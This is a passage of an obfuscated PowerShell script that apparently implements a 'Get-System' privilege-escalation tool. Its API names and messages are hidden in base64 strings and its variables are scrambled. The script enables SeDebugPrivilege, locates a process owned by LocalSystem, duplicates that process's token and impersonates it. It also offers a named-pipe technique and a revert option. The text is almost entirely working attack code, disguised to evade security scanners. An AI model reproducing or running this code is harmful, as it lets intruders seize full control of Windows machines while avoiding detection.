            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHYAYQBwAGkAMwAyAC4AZABsAGwA'))),
            [Reflection.MethodAttributes] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr], [Int32], [IntPtr].MakeByRefType()),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwA=')))).SetCustomAttribute(${_/\_/\/==\____/=\})

        ${_/\/===\__/\_/===}.DefinePInvokeMethod(
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAVABoAHIAZQBhAGQAVABvAGsAZQBuAA=='))),
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHYAYQBwAGkAMwAyAC4AZABsAGwA'))),
            [Reflection.MethodAttributes] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr], [IntPtr]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwA=')))).SetCustomAttribute(${_/\_/\/==\____/=\})

        ${_/\/===\__/\_/===}.DefinePInvokeMethod(
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBQAHIAbwBjAGUAcwBzAFQAbwBrAGUAbgA='))),
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHYAYQBwAGkAMwAyAC4AZABsAGwA'))),
            [Reflection.MethodAttributes] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr], [UInt32], [IntPtr].MakeByRefType()),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwA=')))).SetCustomAttribute(${_/\_/\/==\____/=\})

        ${_/\/===\__/\_/===}.DefinePInvokeMethod(
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAG8AawB1AHAAUAByAGkAdgBpAGwAZQBnAGUAVgBhAGwAdQBlAA=='))),
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHYAYQBwAGkAMwAyAC4AZABsAGwA'))),
            [Reflection.MethodAttributes] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([String], [String], [IntPtr].MakeByRefType()),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwA=')))).SetCustomAttribute(${_/\_/\/==\____/=\})

        ${_/\/===\__/\_/===}.DefinePInvokeMethod(
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGoAdQBzAHQAVABvAGsAZQBuAFAAcgBpAHYAaQBsAGUAZwBlAHMA'))),
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHYAYQBwAGkAMwAyAC4AZABsAGwA'))),
            [Reflection.MethodAttributes] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr], [Bool], ${__/=\__/\_/\/\/=\}.MakeByRefType(),[Int32], [IntPtr], [IntPtr]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwA=')))).SetCustomAttribute(${_/\_/\/==\____/=\})

        ${/\____/\_/===\/\_} = ${_/\/===\__/\_/===}.CreateType()

        ${/=\_/====\__/\__/} = [Int32].Assembly.GetTypes() | ? {$_.Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAE4AYQB0AGkAdgBlAA==')))}
        ${____/\/\______/\/} = ${/=\_/====\__/\__/}.GetMethod(
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwB1AHIAcgBlAG4AdABQAHIAbwBjAGUAcwBzAA=='))),
            [Reflection.BindingFlags] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA==')))
        )

        ${____/\/=\___/==\_} = 0x00000002
        ${_/\_/=\/==\__/\/\} = 0x000F0000
        
        ${___/\/=\_/=\/==\/} = 0x00000001
        ${/====\_/=\__/\__/} = 0x00000002
        ${_/==\/==\/=======} = 0x00000004
        ${_/\_/\/=\/\/=\_/=} = 0x00000008
        ${_/\/\___/=\_/\_/\} = 0x00000010
        ${____/==\_/\_/\/\/} = 0x00000020
        ${/=\__/\___/\/==\/} = 0x00000040
        ${___/==\/\/\/=\__/} = 0x00000080
        ${___/==\_____/==\/} = 0x00000100
        
        ${/\_________/\_/=\} = ${_/\_/=\/==\__/\/\} -bor
            ${___/\/=\_/=\/==\/} -bor
            ${/====\_/=\__/\__/} -bor
            ${_/==\/==\/=======} -bor
            ${_/\_/\/=\/\/=\_/=} -bor
            ${_/\/\___/=\_/\_/\} -bor
            ${____/==\_/\_/\/\/} -bor
            ${/=\__/\___/\/==\/} -bor
            ${___/==\/\/\/=\__/} -bor
            ${___/==\_____/==\/}

        [long]${_/\_/=\__/=\/\__/} = 0

        ${_____/\/\___/====} = [Activator]::CreateInstance(${__/=\__/\_/\/\/=\})
        ${_____/\/\___/====}.Count = 1
        ${_____/\/\___/====}.Luid = ${_/\_/=\__/=\/\__/}
        ${_____/\/\___/====}.Attr = ${____/\/=\___/==\_}

        ${_/====\_/\/=\/\/=} = ${/\____/\_/===\/\_}::LookupPrivilegeValue($Null, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAEQAZQBiAHUAZwBQAHIAaQB2AGkAbABlAGcAZQA='))), [ref]${_____/\/\___/====}.Luid)

        ${/=\_/=\_____/\__/} = [IntPtr]::Zero
        ${_/====\_/\/=\/\/=} = ${/\____/\_/===\/\_}::OpenProcessToken(${____/\/\______/\/}.Invoke($Null, @()), ${/\_________/\_/=\}, [ref]${/=\_/=\_____/\__/})

        
        ${_/====\_/\/=\/\/=} = ${/\____/\_/===\/\_}::AdjustTokenPrivileges(${/=\_/=\_____/\__/}, $False, [ref]${_____/\/\___/====}, 12, [IntPtr]::Zero, [IntPtr]::Zero)

        if(-not(${_/====\_/\/=\/\/=})) {
            Write-Error $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABBAGQAagB1AHMAdABUAG8AawBlAG4AUAByAGkAdgBpAGwAZQBnAGUAcwAgAGYAYQBpAGwAZQBkACwAIABSAGUAdABWAGEAbAAgADoAIAAkAFIAZQB0AFYAYQBsAA=='))) -ErrorAction Stop
        }

        ${___/=\__/\/==\___} = (New-Object -TypeName $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFMAZQBjAHUAcgBpAHQAeQBJAGQAZQBuAHQAaQBmAGkAZQByAA=='))) -ArgumentList ([Security.Principal.WellKnownSidType]::'LocalSystemSid', $null)).Translate([Security.Principal.NTAccount]).Value

        ${____/====\_/\/=\/} = gwmi -Class Win32_Process | % {
            try {
                ${/===\/\/==\/=\_/=} = $_.GetOwner()
                if (${/===\/\/==\/=\_/=}.Domain -and ${/===\/\/==\/=\_/=}.User) {
                    ${_/\/\/=\/\__/==\/} = "$(${/===\/\/==\/=\_/=}.Domain)\$(${/===\/\/==\/=\_/=}.User)".ToUpper()

                    if (${_/\/\/=\/\__/==\/} -eq ${___/=\__/\/==\___}.ToUpper()) {
                        ${_/\/\_/\_/\_/==\/} = ps -Id $_.ProcessId

                        ${____/==\/==\__/=\} = ${/\____/\_/===\/\_}::OpenProcess(0x0400, $False, ${_/\/\_/\_/\_/==\/}.Id)
                        if (${____/==\/==\__/=\}) {
                            ${____/==\/==\__/=\}
                        }
                    }
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABlAHIAcgBvAHIAIABlAG4AdQBtAGUAcgBhAHQAaQBuAGcAIABoAGEAbgBkAGwAZQA6ACAAJABfAA==')))
            }
        } | ? {$_ -and ($_ -ne 0)} | select -First 1

        if ((-not ${____/====\_/\/=\/}) -or (${____/====\_/\/=\/} -eq 0)) {
            Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAG8AYgB0AGEAaQBuACAAYQAgAGgAYQBuAGQAbABlACAAdABvACAAYQAgAHMAeQBzAHQAZQBtACAAcAByAG8AYwBlAHMAcwAuAA==')))
        }
        else {
            [IntPtr]${/==\/=\_/====\__/} = [IntPtr]::Zero
            ${_/====\_/\/=\/\/=} = ${/\____/\_/===\/\_}::OpenProcessToken(([IntPtr][Int] ${____/====\_/\/=\/}), (${_/==\/==\/=======} -bor ${/====\_/=\__/\__/}), [ref]${/==\/=\_/====\__/});${/====\___/\/\___/} = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABPAHAAZQBuAFAAcgBvAGMAZQBzAHMAVABvAGsAZQBuACAAcgBlAHMAdQBsAHQAOgAgACQAUgBlAHQAVgBhAGwA')))
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABPAHAAZQBuAFAAcgBvAGMAZQBzAHMAVABvAGsAZQBuACAAcgBlAHMAdQBsAHQAOgAgACQATABhAHMAdABFAHIAcgBvAHIA')))

            [IntPtr]${/=\/=\/==\/\/=\/=} = [IntPtr]::Zero
            ${_/====\_/\/=\/\/=} = ${/\____/\_/===\/\_}::DuplicateToken(${/==\/=\_/====\__/}, 2, [ref]${/=\/=\/==\/\/=\/=});${/====\___/\/\___/} = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABEAHUAcABsAGkAYwBhAHQAZQBUAG8AawBlAG4AIAByAGUAcwB1AGwAdAA6ACAAJABMAGEAcwB0AEUAcgByAG8AcgA=')))

            ${_/====\_/\/=\/\/=} = ${/\____/\_/===\/\_}::SetThreadToken([IntPtr]::Zero, ${/=\/=\/==\/\/=\/=});${/====\___/\/\___/} = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if(-not(${_/====\_/\/=\/\/=})) {
                Write-Error $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABTAGUAdABUAGgAcgBlAGEAZABUAG8AawBlAG4AIABmAGEAaQBsAGUAZAAsACAAUgBlAHQAVgBhAGwAIAA6ACAAJABSAGUAdABWAGEAbAA='))) -ErrorAction Stop
            }

            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABTAGUAdABUAGgAcgBlAGEAZABUAG8AawBlAG4AIAByAGUAcwB1AGwAdAA6ACAAJABMAGEAcwB0AEUAcgByAG8AcgA=')))
            $null = ${/\____/\_/===\/\_}::CloseHandle(${____/==\/==\__/=\})
        }
    }

    if([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBUAEEA')))) {
        Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABTAGMAcgBpAHAAdAAgAG0AdQBzAHQAIABiAGUAIAByAHUAbgAgAGkAbgAgAFMAVABBACAAbQBvAGQAZQAsACAAcgBlAGwAYQB1AG4AYwBoACAAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAdwBpAHQAaAAgAC0AUwBUAEEAIABmAGwAYQBnAA=='))) -ErrorAction Stop
    }

    if($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBoAG8AQQBtAEkA')))]) {
        echo "$([Environment]::UserDomainName)\$([Environment]::UserName)"
        return
    }

    elseif($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHYAVABvAFMAZQBsAGYA')))]) {
        ${____/==\/\/=\_/==} = ___/==\_/\__/=\/=\ advapi32.dll RevertToSelf
        ${__/==\/=\/\_/\/\/} = __/\____/\_/=\___/ @() ([Bool])
        ${__/=\_/=\____/\_/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${____/==\/\/=\_/==}, ${__/==\/=\/\_/\/\/})

        ${_/====\_/\/=\/\/=} = ${__/=\_/=\____/\_/}.Invoke()
        if(${_/====\_/\/=\/\/=}) {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABSAGUAdgBlAHIAdABUAG8AUwBlAGwAZgAgAHMAdQBjAGMAZQBzAHMAZgB1AGwALgA=')))
        }
        else {
            Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABSAGUAdgBlAHIAdABUAG8AUwBlAGwAZgAgAGYAYQBpAGwAZQBkAC4A')))
        }
        echo "Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
    }

    else {
        if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgA='))))) {
            Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABTAGMAcgBpAHAAdAAgAG0AdQBzAHQAIABiAGUAIAByAHUAbgAgAGEAcwAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIA'))) -ErrorAction Stop
        }

        if($Technique -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQBkAFAAaQBwAGUA')))) {
            
            _/=\/==\___/\/\/=\ -ServiceName $ServiceName -PipeName $PipeName
        }
        else {
            
            __/==\/\/\__/\__/=
        }
        echo "Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
    }
}
